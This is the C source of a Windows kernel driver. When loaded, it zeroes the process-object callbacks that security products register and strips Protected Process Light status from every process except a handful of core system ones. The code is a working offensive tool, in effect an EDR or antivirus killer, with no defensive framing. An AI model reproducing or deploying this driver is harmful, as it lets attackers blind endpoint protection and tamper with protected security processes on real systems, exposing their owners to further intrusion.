#include <ntifs.h>
#include <ntdef.h>

UCHAR * PsGetProcessImageFileName(PEPROCESS Process);

PCHAR SystemPPL[7] = {
"smss.exe",
"csrss.exe",
"wininit.exe",
"lsass.exe",
"winlogon.exe",
"svchost.exe",
};

ULONG GetActiveProcessLinkOffset()
{
	UNICODE_STRING funcName;
	RtlInitUnicodeString(&funcName, L"PsGetProcessId");
	PVOID pFunc = MmGetSystemRoutineAddress(&funcName);
	if (!pFunc) return 0;
	PUCHAR pByte = (PUCHAR)pFunc;
	for (int i = 0; i < 50; i++)
	{
		if (pByte[i] == 0x48 && pByte[i + 1] == 0x8B && pByte[i + 2] == 0x81)
		{
			ULONG pidOffset = *(ULONG*)(pByte + i + 3);
			if (pidOffset < 0x100 || pidOffset > 0x1000) continue;
			ULONG listOffset = pidOffset + 8;
			return listOffset;
		}
	}
	return 0;
}

ULONG GetProtectionoffset() {
    UNICODE_STRING funcName;
    RtlInitUnicodeString(&funcName, L"PsIsProtectedProcess");
    PVOID pFunc = MmGetSystemRoutineAddress(&funcName);
    if (!pFunc) {
        RtlInitUnicodeString(&funcName, L"PsIsProtectedProcessLight");
        pFunc = MmGetSystemRoutineAddress(&funcName);
    }

    if (!pFunc) return 0;

    PUCHAR pByte = (PUCHAR)pFunc;
    ULONG limit = 100;

    for (ULONG i = 0; i < limit; i++) {
        if (pByte[i] == 0xF6 && pByte[i + 1] == 0x81) {
            ULONG offset = *(PULONG)(pByte + i + 2);
            return offset;
        }

        if (pByte[i] == 0x0F && pByte[i + 1] == 0xB6 && pByte[i + 2] == 0x81) {
            ULONG offset = *(PULONG)(pByte + i + 3);
            return offset;
        }
    }

    return 0;
}

ULONG GetobCallbackListoffset(PULONG64 ObjectTypeAddr) {
    UNICODE_STRING funcName;
    RtlInitUnicodeString(&funcName, L"PsProcessType");
    PVOID* ppProcessType = (PVOID*)MmGetSystemRoutineAddress(&funcName);
    if (!ppProcessType) return 0;

    PUCHAR pObjectType = (PUCHAR)(*ppProcessType);
    if (!MmIsAddressValid(pObjectType)) return 0;

    for (ULONG offset = 0x80; offset < 0x150; offset += sizeof(ULONG_PTR)) {
        PLIST_ENTRY pListHead = (PLIST_ENTRY)(pObjectType + offset);
        if (!MmIsAddressValid(pListHead)) continue;

        PLIST_ENTRY pFlink = pListHead->Flink;
        PLIST_ENTRY pBlink = pListHead->Blink;

        if (!MmIsAddressValid(pFlink) || !MmIsAddressValid(pBlink)) continue;
        if (pFlink == pListHead) continue;

        if (MmIsAddressValid(pFlink)) {
            if (pFlink->Blink == pListHead) {
                if (MmIsAddressValid(pBlink) && pBlink->Flink == pListHead) {
                    DbgPrint("[+]Found ObCallbackList offset:0x%x\n", offset);
                    *ObjectTypeAddr = (ULONG_PTR)pObjectType;
                    return offset;
                }
            }
        }
    }

    return 0;
}

void RemoveObCallback() {
    ULONG64 ObjectTypeAddr = 0;
    ULONG CallbackListOffset = GetobCallbackListoffset(&ObjectTypeAddr);
    if (CallbackListOffset == 0 || ObjectTypeAddr == 0) return;

    PLIST_ENTRY pListHead = (PLIST_ENTRY)(ObjectTypeAddr + CallbackListOffset);
    PLIST_ENTRY pCurrent = pListHead->Flink;
    int count = 0;
    KIRQL oldIrql;

    KeRaiseIrql(DISPATCH_LEVEL, &oldIrql);

    while (pCurrent != pListHead && count < 50) {
        if (!MmIsAddressValid(pCurrent)) break;

        ULONG_PTR pItem = (ULONG_PTR)pCurrent;
        PULONG pOps = (PULONG)(pItem + 0x10);

        if (MmIsAddressValid(pOps)) {
            *pOps = 0;
        }

        pCurrent = pCurrent->Flink;
        count++;
    }

    KeLowerIrql(oldIrql);
}

void RemoveProtection() {
    ULONG ProtectionOffset = GetProtectionoffset();
    ULONG ActiveProcessLinksOffset = GetActiveProcessLinkOffset();

    if (ProtectionOffset == 0 || ActiveProcessLinksOffset == 0) return;

    PEPROCESS pSystemProcess = PsInitialSystemProcess;
    PLIST_ENTRY ListHead = (PLIST_ENTRY)((PUCHAR)pSystemProcess + ActiveProcessLinksOffset);
    PLIST_ENTRY NextEntry = ListHead->Flink;

    while (NextEntry != ListHead) {
        PEPROCESS pProcess = (PEPROCESS)((PUCHAR)NextEntry - ActiveProcessLinksOffset);

        if (MmIsAddressValid(pProcess)) {
            BOOLEAN isSystem = FALSE;
            STRING sProcessName, sImageName;
            RtlInitAnsiString(&sImageName, PsGetProcessImageFileName(pProcess));

            for (int i = 0; i < 7; i++) {
                RtlInitAnsiString(&sProcessName, SystemPPL[i]);
                if (RtlCompareString(&sProcessName, &sImageName, TRUE) == 0) {
                    isSystem = TRUE;
                    break;
                }
            }

            if (!isSystem) {
                PUCHAR pProtection = (PUCHAR)((PUCHAR)pProcess + ProtectionOffset);
                *pProtection = 0;
            }
        }

        NextEntry = NextEntry->Flink;
    }
}

VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);

    RemoveObCallback();
    RemoveProtection();

    DriverObject->DriverUnload = DriverUnload;
    return STATUS_SUCCESS;
}



